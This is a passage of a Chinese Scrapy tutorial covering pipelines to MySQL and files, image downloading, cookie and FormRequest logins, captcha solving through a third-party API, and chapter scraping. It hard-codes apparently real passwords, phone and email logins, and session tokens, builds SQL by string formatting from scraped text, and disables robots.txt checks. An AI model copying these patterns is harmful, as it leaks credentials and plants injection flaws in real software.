在终端输入上述命令后，能够进入python的交互式终端，此时可以使用：

```python
- response.xpath()： ## 直接测试xpath规则是否正确
- response.url：## 当前响应的url地址
- response.request.url：## 当前响应对应的请求的url地址
- response.headers：## 响应头
- response.body：## 响应体，也就是html代码，默认是byte类型
- response.request.headers：## 当前响应的请求头
```

### 4-2 settings.py中的设置信息

#### 4-2-1 为什么项目中需要配置文件

在配置文件中存放一些公共变量，在后续的项目中方便修改，如：本地测试数据库和部署服务器的数据库不一致

#### 4-2-2  配置文件中的变量使用方法

1. 变量名一般全部大写
2. 导入即可使用

#### 4-2-3 settings.py中的重点字段和含义

```python
- USER_AGENT ## 设置ua

- ROBOTSTXT_OBEY ## 是否遵守robots协议，默认是遵守

- CONCURRENT_REQUESTS ## 设置并发请求的数量，默认是16个

- DOWNLOAD_DELAY ## 下载延迟，默认无延迟 （下载器在从同一网站下载连续页面之前应等待的时间（以秒为单位）。这可以用来限制爬行速度，以避免对服务器造成太大影响）

- COOKIES_ENABLED ## 是否开启cookie，即每次请求带上前一次的cookie，默认是开启的

- DEFAULT_REQUEST_HEADERS ## 设置默认请求头，这里加入了USER_AGENT将不起作用

- SPIDER_MIDDLEWARES ## 爬虫中间件，设置过程和管道相同

- DOWNLOADER_MIDDLEWARES ## 下载中间件

- LOG_LEVEL ## 控制终端输出信息的log级别，终端默认显示的是debug级别的log信息

  - LOG_LEVEL = "WARNING"
    - CRITICAL  严重
    - ERROR  错误
    - WARNING  警告
    - INFO  消息
    - DEBUG   调试

- LOG_FILE ## 设置log日志文件的保存路径，如果设置该参数，终端将不再显示信息

  LOG_FILE = "./test.log"

  ## 其他设置参考：https://www.jianshu.com/p/df9c0d1e9087
```

### 4-3 scrapy 管道

#### 4.1 使用终端命令行进行存储

代码配置

scrapy练习/duanzi/duanzi/spiders/dz.py

```python
import scrapy


class DzSpider(scrapy.Spider):
    name = 'dz'
    # allowed_domains = ['duanzixing.com']
    start_urls = ['http://duanzixing.com/']

    def parse(self, response,**kwargs):
        article_list = response.xpath('//article[@class="excerpt"]')
        for article in article_list:
            title = article.xpath('./header/h2/a/text()').extract_first()
            con = article.xpath('./p[@class="note"]//text()').extract_first()
            data = {'title':title,'con':con}

            ## 把数据传给管道
            yield data

```

终端命令

只能存储csv格式，而且数据传给管道以后才可以用这个命令

```Python
## scrapy crawl 爬虫名称 -o 文件名.csv  
scrapy crawl ITSpider -o ITSpider.csv  

## 将文件存储到ITSpider.csv  文件中
```

思考：为什么要使用yield？

1. 让整个函数变成一个生成器，有什么好处呢？
2. 遍历这个函数的返回值的时候，挨个把数据读到内存，不会造成内存的瞬间占用过高
3. python3中的range和python2中的xrange同理

**注意：yield能够传递的对象只能是：BaseItem,Request,dict,None**

#### 4-2 开启管道

settings.py 打开当前注释

```python
ITEM_PIPELINES = {
   'doubanfile.pipelines.DoubanfilePipeline': 300,
}
```

pipeline中常用的方法：

```python
1. process_item(self,item,spider): ## 实现对item数据的处理
2. open_spider(self, spider):  ## 在爬虫开启的时候仅执行一次
3. close_spider(self, spider): ## 在爬虫关闭的时候仅执行一次
```

```Python
class DuanziPipeline:
    ## 开启的时候走一次
    def open_spider(self,spider):
        pass

    # 每次yield的数据过来走一次
    def process_item(self, item, spider):
        return item

    # scrapy之心完走一次
    def close_spider(self,spider):
        pass
```

#### 4-3 把数据存储在数据库中

代码配置

scrapy练习/duanzi/duanzi/spiders/dz.py

```Python
import scrapy


class DzSpider(scrapy.Spider):
    name = 'dz'
    # allowed_domains = ['duanzixing.com']
    start_urls = ['http://duanzixing.com/']

    def parse(self, response,**kwargs):
        article_list = response.xpath('//article[@class="excerpt"]')
        for article in article_list:
            title = article.xpath('./header/h2/a/text()').extract_first()
            con = article.xpath('./p[@class="note"]//text()').extract_first()
            data = {'title':title,'con':con}

            ## 把数据传给管道
            yield data
```

管道中连接数据库进行存储

```python
from itemadapter import ItemAdapter

import pymysql

class DuanziPipeline:
    ## 开启的时候走一次
    def open_spider(self,spider):
        # 连接MySQL数据库
        self.db = pymysql.connect(host='127.0.0.1', user='root', password='aini5726', db='duanzi',port=3306)

        # 设置字符集  防止乱码
        self.db.set_charset('utf8')

        # 创建游标对象
        self.cursor = self.db.cursor()

    # 每次yield的数据过来走一次
    def process_item(self, item, spider):
        ##  item是传递过来的数据
        ## 把数据存储到数据库中
        title = item['title']
        con = item['con']
        try:
            sql = f'insert into dz set title = "{title}",con = "{con}"'
            self.cursor.execute(sql)
            self.db.commit()
        except Exception as e:
            print(sql,'===>',e)
            self.db.rollback()
        return item

    # scrapy之心完走一次
    def close_spider(self,spider):
        ## 关闭数据库连接
        self.db.close()
```

#### 4-4 把文件写入到文件中

```Python
from itemadapter import ItemAdapter

class Duanzi01Pipeline:
    def open_spider(self,spider):
        self.f = open('duanzi.txt','w',encoding='utf-8')
    def process_item(self, item, spider):
        title = item['title']
        con = item['con']
        ## 写入到文件中件中
        self.f.write(f'{title}\n{con}\n')
        return item

    def close_spider(self,spider):
        self.f.close()
```

#### 4-5 同时写入到MySQL和文件中

首先在setting中开启管道

```python
ITEM_PIPELINES = {
    # 写入到MySQL数据库中
   'duanzi03.pipelines.DuanziMYSQLPipeline': 300,
    # 写入到文件中
   'duanzi03.pipelines.DuanziFILEPipeline': 400,
}
```

然后写两个管道，分别把数据存储到数据库和文件中

```Python
from itemadapter import ItemAdapter
import pymysql
# 写入到MySQL数据库之
class DuanziMYSQLPipeline:
    # 开启一次
    def open_spider(self, spider):
        # print(spider.name)
        # 连接MySQL数据库
        self.db = pymysql.connect(host='127.0.0.1', user='root', password='123456', db='duanzi')
        # 设置字符编码
        self.db.set_charset('utf8')
        # 创建游标对象
        self.cursor = self.db.cursor()

    # 每次yield的数据过来走一次
    def process_item(self, item, spider):
        title = item['title']
        con = item['con']
        try:
            sql = f'insert into dz(title, con) values("{title}", "{con}")'
            self.cursor.execute(sql)  # 执行SQL语句
            self.db.commit()  # 事务提交 写入到MySQL数据库中
        except Exception as e:
            print(sql, '===>', e)  # 打印错误异常信息
            self.db.rollback()  # 事务回滚
        # item是传递过来的数据
        return item

    # scrapy执行完走一次
    def close_spider(self, spider):
        # 关闭数据库连接
        self.db.close()

# 写入到文件中
class DuanziFILEPipeline:
    def open_spider(self, spider):
        self.f = open('duanzi.txt', 'w', encoding='UTF-8')

    def process_item(self, item, spider):
        title = item['title']
        con = item['con']
        # 写入到文件中
        self.f.write(f'{title}\n{con}\n')
        return item   # return不能去掉！！！

    def close_spider(self, spider):
        self.f.close()
```

#### 4-6 管道注意点

**思考：pipeline在settings中能够开启多个，为什么需要开启多个？**

```python
1. 不同的pipeline可以处理不同爬虫的数据，通过spider.name属性来区分
2. 不同的pipeline能够对一个或多个爬虫进行不同的数据处理的操作，比如一个进行数据清洗，一个进行数据的保存
3. 同一个管道类也可以处理不同爬虫的数据，通过spider.name属性来区分
```

##### 4-6-1 pipeline使用注意点

```python
1. 使用之前需要在settings中开启
2. pipeline在setting中键表示位置(即pipeline在项目中的位置可以自定义)，值表示距离引擎的远近，越近数据会越先经过
3. 有多个pipeline的时候，process_item的方法必须return item,否则后一个pipeline取到的数据为None值
4. pipeline中process_item的方法必须有，否则item没有办法接受和处理
5. process_item方法接受item和spider，其中spider表示当前传递item过来的spider
6. open_spider(spider) :能够在爬虫开启的时候执行一次
7. close_spider(spider) :能够在爬虫关闭的时候执行一次
8. 上述俩个方法经常用于爬虫和数据库的交互，在爬虫开启的时候建立和数据库的连接，在爬虫关闭的时候断开和数据库的连接
```

##### 4-6-2 总结

```python
1. debug能够展示当前程序的运行状态 
2. scrapy shell能够实现xpath的测试和对象属性和方法的尝试
3. scrapy的settings.py能够实现各种自定义的配置，比如下载延迟和请求头等
4. 管道能够实现数据的清洗和保存，能够定义多个管道实现不同的功能，其中有个三个方法
   - process_item(self,item,spider):实现对item数据的处理
   - open_spider(self, spider): 在爬虫开启的时候仅执行一次
   - close_spider(self, spider): 在爬虫关闭的时候仅执行一次
```

#### 4-7 下载图片

##### 4-7-1  安装模块

```
pip install pillow
```

##### 4-7-2 抓取网址

https://desk.zol.com.cn/dongman/

##### 4-7-3 创建工程

```python
+ scrapy startproject desk
+ cd desk
+ scrapy genspider img desk.zol.com.cn/dongman
```

##### 4-7-4  配置settings.py

```python
# 设置日志级别
LOG_LEVEL = 'ERROR'
ROBOTSTXT_OBEY = False
# 设置请求头
DEFAULT_REQUEST_HEADERS = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en',
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
}
```

##### 4-7-5 img.py 爬虫代码书写

思路：

抓取到详情页中图片的url地址，交给图片管道进行下载

```python
import scrapy
from urllib.parse import urljoin


class ImgSpider(scrapy.Spider):
    name = 'img'
    # allowed_domains = ['desk.zol.com.cn/dongman']
    start_urls = ['http://desk.zol.com.cn/dongman/']

    def parse(self, resp, **kwargs):
        # 先抓取到每个图片详情的url
        url_list = resp.xpath('//ul[@class="pic-list2  clearfix"]/li/a/@href').extract()
        # 获取到url列表后 进行循环进行每一个url详情页的请求
        for url in url_list:
            # 因为抓取到的url并不完整，需要进行手动拼接
            # urljoin('https://desk.zol.com.cn/dongman/', '/bizhi/8301_103027_2.html')
            url = urljoin('https://desk.zol.com.cn/dongman/', url)
            # 拼凑完发现当前url中有下载exe的url，将其去除
            if url.find('exe') != -1:
                continue
            yield scrapy.Request(url, callback=self.parse_detail)

    # 对详情页进行解析
    def parse_detail(self, resp):
        # 获取当前详情页中最大尺寸图片的url
        max_img_url = resp.xpath('//dd[@id="tagfbl"]/a/@href').extract()
        # 判断当前最大图片的url地址，为倒数第二个，如果当前图片列表url长度小于2 则当前证明不是图片的url
        if len(max_img_url) > 2:
            max_img_url = urljoin('https://desk.zol.com.cn/', max_img_url[0])
            # 对url页面进行请求 获取最终大图的页面
            yield scrapy.Request(max_img_url, callback=self.parse_img_detail)

    def parse_img_detail(self, resp):
        # 解析出大图的url
        img_src = resp.xpath("//img[1]/@src").extract_first()
        return {'img_src': img_src}
```

**注意：**

如果抓取过程中遇到如下报错，可能是cryptography 版本问题

```
twisted.web._newclient.ResponseNeverReceived: [<twisted.python.failure.Failure OpenSSL.SSL.Error: [('SSL routines', '', 'unsafe legacy renegotiation disabled')]>]
```

解决：

```python
## 1、pip卸载cryptography：
	pip uninstall cryptography
	## 重新安装cryptography 36.0.2：
	pip install cryptography==36.0.2

## 2、pip卸载pyOpenSSL：
	pip uninstall pyOpenSSL
    ## 重新安装pyOpenSSL 22.0.0：
	pip install pyOpenSSL==22.0.0
```

##### 4-7-6  配置图片管道

打开Pipelines文件夹

因为我们不能再像之前存储文本一样，使用之前的管道类（Pipeline），我们需要用到新的存储图片的管道类ImagesPipeline，因此我们需要先导入该类

pipelines.py

+ 导入

  ```python
  from scrapy.pipelines.images import ImagesPipeline
  ```

+ 定义一个Images类

  ```python
  from itemadapter import ItemAdapter
  from scrapy.pipelines.images import ImagesPipeline
  import scrapy
  
  class Imgspipline(ImagesPipeline):
      # 1. 发送请求(下载图片, 文件, 视频,xxx)
      def get_media_requests(self, item, info):
        	# 获取到图片的url
          url = item['img_src']
          # 进行请求
          yield scrapy.Request(url=url, meta={"url": url})  # 直接返回一个请求对象即可
  
      # 2. 图片存储路径
      def file_path(self, request, response=None, info=None, *, item=None):
          # 当前获取请求的url的方式有2种
          # 获取到当前的url 用于处理下载图片的名称
          file_name = item['img_src'].split("/")[-1]  # 用item拿到url
          # file_name = request.meta['url'].split("/")[-1]  # 用meta传参获取
          return file_name
  
      # 3. 可能需要对item进行更新
      def item_completed(self, results, item, info):
          # print('results', results)
          for r in results:
              # 获取每个图片的路径
              print(r[1]['path'])
          return item  # 一定要return item 把数据传递给下一个管道
  ```

##### 4-7-7  保存数据

接着我们再定义一个保存数据的函数，并设置好存储的文件名，然后存储的路径需要在设置中（setting）文件中，添加IMAGE_STORE设置好存储的路径

开启图片管道

**settings.py**

```python
ITEM_PIPELINES = {
   'desk.pipelines.DeskPipeline': 300,
   'desk.pipelines.Imgspipline': 400,  # 开启图片管道
}
# 配置存储图片的路径
IMAGES_STORE = './imgs'
```

### 4-4 模拟登录

#### 4-4-1、之前的模拟登陆的方法

##### 1.1 requests模块是如何实现模拟登陆的？

```
1. 直接携带cookies请求页面
2. 找url地址，发送post请求存储cookie
```

##### 1.2 selenium是如何模拟登陆的？

1. 找到对应的input标签，输入文本点击登陆

##### 1.3 scrapy有二种方法模拟登陆

```
1. 直接携带cookies
2. 找url地址，发送post请求存储cookie
```

#### 4-4-2、scrapy携带cookies登录

**17k小说网**

```
https://user.17k.com/
```

**2.1 应用场景**

```
1. cookie过期时间很长，常见于一些不规范的网站
2. 能在cookie过期之前把所有的数据拿到
3. 配合其他程序使用，比如其使用selenium把登陆之后的cookie获取到保存到本地，scrapy发送请求之前先读取本地cookie
```

**2.2 通过修改settings中DEFAULT_REQUEST_HEADERS携带cookie**

settings.py

```python
DEFAULT_REQUEST_HEADERS = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en',
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
  'Cookie': 'ASP.NET_SessionId=n4lwamv5eohaqcorfi3dvzcv; xiaohua_visitfunny=103174; xiaohua_web_userid=120326; xiaohua_web_userkey=r2sYazfFMt/rxUn8LJDmUYetwR2qsFCHIaNt7+Zpsscpp1p6zicW4w=='
}
```

注意：需要打开COOKIES_ENABLED，否则上面设定的cookie将不起作用

```python
# Disable cookies (enabled by default)
COOKIES_ENABLED = False
```

其他配置也别忘了

```python
ROBOTSTXT_OBEY = False
LOG_LEVEL = 'WARNING'
```

**xiaoshuo.py**

```python
import scrapy


class DengluSpider(scrapy.Spider):
    name = 'denglu'
    allowed_domains = ['17k.com']
    start_urls = ['https://user.17k.com/ck/user/mine/readList?page=1&appKey=2406394919']

    def parse(self, res):
        print(res.text)
```

**局限性：**

当前设定方式虽然可以实现携带cookie保持登录，但是无法获取到新cookie，也就是当前cookie一直是固定的，如果cookie是经常性变化，那么当前不适用

#### 4-4-3 重构scrapy的start_rquests方法

把cookie处理成字典的代码

```python
cookie_str = 'GUID=bb4eef9b-1b8f-417e-9264-3cdc3bad8eb1; c_channel=0; c_csc=web; Hm_lvt_9793f42b498361373512340937deb2a0=1697788773,1698241318,1699877224; accessToken=avatarUrl%3Dhttps%253A%252F%252Fcdn.static.17k.com%252Fuser%252Favatar%252F18%252F98%252F90%252F96139098.jpg-88x88%253Fv%253D1650527904000%26id%3D96139098%26nickname%3D%25E4%25B9%25A6%25E5%258F%258BqYx51ZhI1%26e%3D1715429231%26s%3D14c085a75371ffc5; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2296139098%22%2C%22%24device_id%22%3A%2218b4c18c0cf39c-0a8b44b4b81a83-26031151-1866240-18b4c18c0d06e0%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%2C%22first_id%22%3A%22bb4eef9b-1b8f-417e-9264-3cdc3bad8eb1%22%7D'

# 规律
"""
key=val;key=val;key=val;key=val;
"""
# list_cookie = cookie_str.split(';')
# print(list_cookie)
"""
cookie_dict = {}
for cookie in cookie_str.split(';'):
    list_cookie = cookie.split('=')
    cookie_dict[list_cookie[0]] = list_cookie[1]
# print(cookie_dict)
"""
cookie_dict = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookie_str.split(';')}
print(cookie_dict)
```

scrapy中start_url是通过start_requests来进行处理的，其实现代码如下，这样的话setting中的COOKIES_ENABLED = True不用关了。

```python
def start_requests(self):
    cls = self.__class__
    if method_is_overridden(cls, Spider, 'make_requests_from_url'):
        warnings.warn(
            "Spider.make_requests_from_url method is deprecated; it "
            "won't be called in future Scrapy releases. Please "
            "override Spider.start_requests method instead (see %s.%s)." % (
                cls.__module__, cls.__name__
            ),
        )
        for url in self.start_urls:
            yield self.make_requests_from_url(url)
    else:
        for url in self.start_urls:
            yield Request(url, dont_filter=True)
```

所以对应的，如果start_url地址中的url是需要登录后才能访问的url地址，则需要重写start_request方法并在其中手动添加上cookie

settings.py

```python
import scrapy


class DengluSpider(scrapy.Spider):
    name = 'denglu'
    # allowed_domains = ['https://user.17k.com/ck/user/mine/readList?page=1']
    start_urls = ['https://user.17k.com/ck/user/mine/readList?page=1&appKey=2406394919']

    def start_requests(self):
        cookies = 'GUID=796e4a09-ba11-4ecb-9cf6-aad19169267d; Hm_lvt_9793f42b498361373512340937deb2a0=1660545196; c_channel=0; c_csc=web; accessToken=avatarUrl%3Dhttps%253A%252F%252Fcdn.static.17k.com%252Fuser%252Favatar%252F18%252F98%252F90%252F96139098.jpg-88x88%253Fv%253D1650527904000%26id%3D96139098%26nickname%3D%25E4%25B9%25A6%25E5%258F%258BqYx51ZhI1%26e%3D1677033668%26s%3D8e116a403df502ab; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2296139098%22%2C%22%24device_id%22%3A%22181d13acb2c3bd-011f19b55b75a8-1c525635-1296000-181d13acb2d5fb%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%2C%22first_id%22%3A%22796e4a09-ba11-4ecb-9cf6-aad19169267d%22%7D; Hm_lpvt_9793f42b498361373512340937deb2a0=1661483362'
        cookie_dic = {}
        for i in cookies.split(';'):
            v = i.split('=')
            cookie_dic[v[0]] = v[1]
        # {i.split('=')[0]:i.split('=')[1] for i in cookies_str.split('; ')}   # 简写
        for url in self.start_urls:
            yield scrapy.Request(url, cookies=cookie_dic)


    def parse(self, response):
        print(response.text)
```

**注意：**

1. scrapy中cookie不能够放在headers中，在构造请求的时候有专门的cookies参数，能够接受字典形式的coookie
2. 在setting中设置ROBOTS协议、USER_AGENT

#### 4-4-4 scrapy.FormRequest发送post请求

```python
# 我们知道可以通过scrapy.Request()指定method、body参数来发送post请求；那么也可以使用scrapy.FormRequest()来发送post请求
```

##### 4-1  scrapy.FormRequest()的使用

通过scrapy.FormRequest能够发送post请求，同时需要添加fromdata参数作为请求体，以及callback

```python
import scrapy

class DlSpider(scrapy.Spider):
    name = 'dl'
    allowed_domains = ['17k.com']
    start_urls = ['https://user.17k.com/ck/user/myInfo/96139098?bindInfo=1&appKey=2406394919']

    def start_requests(self):
        # 登录的url地址
        login_url = 'https://passport.17k.com/ck/user/login'
        data = {
            'loginName': '17346570232',
            'password': 'xlg17346570232'
        }
        # data = 'loginName=17346570232&password=xlg17346570232'
        # yield scrapy.Request(login_url, body=data, method='POST', callback=self.parse_do_login)
        yield scrapy.FormRequest(login_url, formdata=data, callback=self.parse_do_login)

    def parse_do_login(self, response, **kwargs):
        # 当前对于start_urls中的地址进行请求
        yield scrapy.Request(self.start_urls[0])

    def parse(self, response, **kwargs):
        print(response.text)
```

##### 4-2 使用scrapy.FormRequest()登陆

###### 4-2-1  思路分析

```python
1. 找到post的url地址：点击登录按钮进行抓包，然后定位url地址为https://user.17k.com/ck/user/mine/readList?page=1&appKey=2406394919
2. 找到请求体的规律：分析post请求的请求体，其中包含的参数均在前一次的响应中
3. 否登录成功：通过请求个人主页，观察是否包含用户名
```

###### 4-2-2 代码实现如下：

```python
import scrapy


class DengluSpider(scrapy.Spider):
    name = 'denglu'
    # allowed_domains = ['17k.com']
    start_urls = ['https://user.17k.com/ck/user/mine/readList?page=1&appKey=2406394919']

    def start_requests(self):
        '''
        请求登陆的账号和密码
        '''
        login_url = 'https://passport.17k.com/ck/user/login'
        # 使用request进行请求
        # yield scrapy.Request(url=login_url, body='loginName=17346570232&password=xlg17346570232', callback=self.do_login, method='POST')
        # 使用Request子类FormRequest进行请求  自动为post请求
        yield scrapy.FormRequest(
            url=login_url,
            formdata={'loginName': '17346570232', 'password': 'xlg17346570232'},
            callback=self.do_login
        )

    def do_login(self, response):
        '''
        登陆成功后调用parse进行处理
        cookie中间件会帮我们自动处理携带cookie
        '''
        for url in self.start_urls:
            yield scrapy.Request(url=url, callback=self.parse)

    def parse(self, response, **kwargs):
        print(response.text)
```

###### 4-4-3、小技巧

在settings.py中通过设置COOKIES_DEBUG=TRUE 能够在终端看到cookie的传递传递过程

注意关闭LOG_LEVEL 

#### 4-4-5 验证码处理

##### 5-1  传统登录处理

```Python
import base64
import json
import requests

url = 'https://so.gushiwen.cn/user/login.aspx?from=http%3a%2f%2fso.gushiwen.cn%2fuser%2fcollect.aspx'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Referer':'https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx',
}
data = {
    '__VIEWSTATE': 'mz408EoRxmRm5lSHqJ2RgFvDmJqOk/mNy0oQveKPJPdj0PQK8DemwQgoq6A8jEwXORmftrgcWnfuSWI1oRJrgp6x5kl+ouo08OG//6RLDTfZF2Zgi6K9midMNOik8R5upVE3d0PXol3YVxWLqkfOYpZRLHk=',
    '__VIEWSTATEGENERATOR': 'C93BE1AE',
    'from': 'http://so.gushiwen.cn/user/collect.aspx',
    'email': '793390457@qq.com',
    'pwd': 'xlg17346570232',
    'code': '',
    'denglu': '登录'
}

def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ""


if __name__ == "__main__":
    img_path = "yzm.jpg"
    # 验证码地址
    yzm_url = 'https://so.gushiwen.cn/RandCode.ashx'
    session = requests.Session()
    img_res = session.get(yzm_url)
    # 验证码存入本地
    with open(img_path, 'wb') as f:
        f.write(img_res.content)
    # 识别验证码
    result = base64_api(uname='luckyboyxlg', pwd='17346570232', img=img_path, typeid=3)
    print(result)
    # 验证码扔进表单
    data['code'] = result
    # 请求登录接口
    res = session.post(url, headers=headers, data=data)
    with open('gsw.html', 'w', encoding='UTF-8') as f:
        f.write(res.content.decode())

```

##### 5-2 scrapy处理验证码

```python
import scrapy
import json
import base64
import requests

class DlSpider(scrapy.Spider):
    name = 'dl'
    # allowed_domains = ['dl.com']
    start_urls = ['https://so.gushiwen.cn/RandCode.ashx']

    def parse(self, response, **kwargs):
        img_path = "yzm.jpg"
        with open(img_path, 'wb') as f:
            f.write(response.body)
        # 识别验证码
        result = self.base64_api(uname='luckyboyxlg', pwd='17346570232', img=img_path, typeid=3)
        print(result)
        data = {
            '__VIEWSTATE': 'mz408EoRxmRm5lSHqJ2RgFvDmJqOk/mNy0oQveKPJPdj0PQK8DemwQgoq6A8jEwXORmftrgcWnfuSWI1oRJrgp6x5kl+ouo08OG//6RLDTfZF2Zgi6K9midMNOik8R5upVE3d0PXol3YVxWLqkfOYpZRLHk=',
            '__VIEWSTATEGENERATOR': 'C93BE1AE',
            'from': 'http://so.gushiwen.cn/user/collect.aspx',
            'email': '793390457@qq.com',
            'pwd': 'xlg17346570232',
            'code': result,
            'denglu': '登录'
        }
        # 请求登录接口
        url = 'https://so.gushiwen.cn/user/login.aspx?from=http%3a%2f%2fso.gushiwen.cn%2fuser%2fcollect.aspx'
        yield scrapy.FormRequest(url, formdata=data, callback=self.parse_login)

    def parse_login(self, response):
        with open('gsw.html', 'w', encoding='UTF-8') as f:
            f.write(response.text)

    def base64_api(self, uname, pwd, img, typeid):
        with open(img, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            b64 = base64_data.decode()
        data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
        result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
        if result['success']:
            return result["data"]["result"]
        else:
            #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
            return result["message"]
        return ""
```

### 4-5 scrapy发送翻页请求

#### 4-5-1 传统抓取四大名著

##### 5-1-1  request抓取

```Python
from urllib.parse import urljoin
import requests
from lxml import etree


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}
url = 'https://www.shicimingju.com/bookmark/sidamingzhu.html'
response = requests.get(url, headers=headers)
con = response.content.decode()
tree = etree.HTML(con)
# print(con)
book_list = tree.xpath('//div[@class="book-item"]/h3/a')
for a in book_list:
    href = urljoin('https://www.shicimingju.com/',a.xpath('./@href')[0])
    book_name = a.xpath('./text()')[0]
    print(href, book_name)
```

##### 5-1-2 抓取章节

```python
from urllib.parse import urljoin
import requests
from lxml import etree

# 获取章节名称和url
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}
url = 'https://www.shicimingju.com/book/sanguoyanyi.html'
response = requests.get(url, headers=headers)
con = response.content.decode()
tree = etree.HTML(con)
# 获取所有的章节的超链接
mulu_list = tree.xpath('//div[@class="book-mulu"]/ul/li/a')
for mulu in mulu_list:
    # 拼接完整的章节url
    mulu_url = urljoin('https://www.shicimingju.com/', mulu.xpath('./@href')[0])
    # 获取章节名称
    mulu_name = mulu.xpath('./text()')[0]
    print(mulu_url, mulu_name)
```

##### 5-1-3 抓取书的内容

```python
from urllib.parse import urljoin
import requests
from lxml import etree


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}
url = 'https://www.shicimingju.com/book/sanguoyanyi/1.html'
response = requests.get(url, headers=headers)
con = response.content.decode()
tree = etree.HTML(con)
# 抓取章节的内容
con = ''.join(tree.xpath('//div[@class="card bookmark-list"]//text()'))
print(con)
```

##### 5-1-4 最终版本

```python
import os.path
import time
from urllib.parse import urljoin
import requests
from lxml import etree
import random

def get_data(url):
    '''
    对url发起请求  返回tree对象
    :param url: 请求的url地址
    :return: tree对象
    '''
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }
    response = requests.get(url, headers=headers)
    con = response.content.decode()
    tree = etree.HTML(con)
    return tree


def get_book(tree):
    '''
    获取书的名称和url地址
    :param tree: 当前内容的tree对象
    :return: 书名和url的字典 {'三国演义': ‘http://www......’}
    '''
    book_list = tree.xpath('//div[@class="book-item"]/h3/a')
    book_href_name = {}
    for a in book_list:
        href = urljoin('https://www.shicimingju.com/', a.xpath('./@href')[0])
        book_name = a.xpath('./text()')[0]
        # print(href, book_name)
        book_href_name[book_name] = href
    return book_href_name


def get_mulu(tree):
    '''
    获取书章节的url和名称
    :param tree: 请求章节内容返回的tree对象
    :return: dict {'第一章': 'http://www....'}
    '''
    mulu_list = tree.xpath('//div[@class="book-mulu"]/ul/li/a')
    mulu_href_name = {}
    for mulu in mulu_list:
        # 拼接完整的章节url
        mulu_url = urljoin('https://www.shicimingju.com/', mulu.xpath('./@href')[0])
        # 获取章节名称
        mulu_name = mulu.xpath('./text()')[0]
        # print(mulu_url, mulu_name)
        mulu_href_name[mulu_name] = mulu_url
    return mulu_href_name


def get_content(book_name, mulu_name, tree):
    '''
    将章节内容写入到本地
    :param book_name: 书的名称
    :param mulu_name:  章节名称
    :param tree: tree对象
    :return: None
    '''
    # 如果当前书的目录不存在 则创建
    if not os.path.exists(book_name):
        os.mkdir(book_name)
    # 抓取章节的内容
    con = ''.join(tree.xpath('//div[@class="card bookmark-list"]//text()'))
    # print(con)
    with open(os.path.join(book_name, mulu_name+'.txt'), 'w', encoding='UTF-8') as f:
        f.write(con)
    print(book_name, mulu_name, '下载完成')


if __name__ == '__main__':
    url = 'https://www.shicimingju.com/bookmark/sidamingzhu.html'
    # 获取书的url和书的名称
    for book_name, book_url in get_book(get_data(url)).items():
        # 循环获取章节和章节url
        for mulu_name, mulu_url in get_mulu(get_data(book_url)).items():
            # 进行下载
            get_content(book_name, mulu_name, get_data(mulu_url))
            time.sleep(random.randint(1,3))
```



#### 4-5-2  scrapy.Request的更多参数

```Python
scrapy.Request(url[,callback,method="GET",headers,body,cookies, meta,dont_filter=False])
```

参数解释

```Python
1. 中括号中的参数为可选参数
2. callback：## 表示当前的url的响应交给哪个函数去处理
3. meta：## 实现数据在不同的解析函数中传递，meta默认带有部分数据，比如下载延迟，请求深度等
